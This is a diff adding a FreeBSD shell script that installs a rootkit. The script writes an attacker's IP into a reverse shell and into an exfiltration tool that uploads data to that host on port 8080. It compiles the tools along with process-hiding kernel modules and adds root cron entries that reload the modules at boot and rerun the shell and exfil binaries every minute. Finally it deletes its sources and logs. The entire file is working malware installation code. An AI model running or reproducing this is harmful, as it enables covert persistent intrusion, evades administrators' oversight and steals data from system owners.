@@ -1,0 +1,66 @@
+#!/bin/sh
+
+currDir=$(pwd)
+bin_shell='shell-bca6da7fa355cf7d9349e7267454df9f8128279b2c1ade54eafac3208a7fe878'
+bin_exfil='exfil-579c66d76d7b5890d6dc124345ddd7307ba2d8f045c2d1105998fafd8834d74c'
+bin_hideproc='hideProc-2fcf3aeb092fd71870420b2158873b2b774fb5d23f7fa6bd3a632ac02900d76a'
+bin_trivial='trivial-6d4c9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008'
+rootkit_dir='6d4c9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008'
+cronPath="/var/cron/tabs/toor"
+
+# Set up remote IP
+echo '#define PING_IP "ping -c 1 $1"' | cat - $currDir/src/shell/directShell.c > tmp && mv tmp $currDir/src/shell/directShell.c
+echo '#define REMOTE_IP "http://$1:8080/upload"' | cat - $currDir/src/exfil/exfil.c > tmp && mv tmp $currDir/src/exfil/exfil.c
+
+# Compile 
+echo "Compiling..."
+cd $currDir/src/shell
+make clean > /dev/null 2>&1
+make > /dev/null 2>&1
+cd ../..
+
+cd $currDir/src/exfil
+make clean > /dev/null 2>&1
+make > /dev/null 2>&1
+cd ../..
+
+cd $currDir/src/hideProc
+make clean > /dev/null 2>&1
+make > /dev/null 2>&1
+cd ../..
+
+cd $currDir/src
+make clean > /dev/null 2>&1
+make > /dev/null 2>&1
+cd ..
+
+# Move binariies to `trivial/6d4c9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008`
+echo "Moving..."
+mkdir $rootkit_dir
+mv $currDir/src/shell/$bin_shell ./$rootkit_dir/
+mv $currDir/src/exfil/$bin_exfil ./$rootkit_dir/
+mv $currDir/src/hideProc/$bin_hideproc.ko ./$rootkit_dir/
+mv $currDir/src/$bin_trivial.ko ./$rootkit_dir/
+
+# Set up Persistence
+echo "Persisting..."
+echo "@reboot sudo kldload $currDir/$rootkit_dir/$bin_trivial.ko >/dev/null 2>&1" > $cronPath
+echo "@reboot sudo kldload $currDir/$rootkit_dir/$bin_hideproc.ko >/dev/null 2>&1" >> $cronPath
+
+# run reverse shell, this will listen on port 8888
+echo "* * * * * $currDir/$rootkit_dir/$bin_shell >/dev/null 2>&1" >> $cronPath
+echo "* * * * * $currDir/$rootkit_dir/$bin_exfil >/dev/null 2>&1" >> $cronPath
+
+chmod 600 $cronPath > /dev/null
+
+# Load the KLD (should be running as root, but sudo just in case)
+echo "Installing..."
+sudo kldload ./$rootkit_dir/$bin_hideproc.ko > /dev/null 2>&1 
+sudo kldload ./$rootkit_dir/$bin_trivial.ko > /dev/null 2>&1 
+
+# Tidy Up
+echo "Cleaning..."
+rm -rf src
+rm install
+rm remote
+rm log
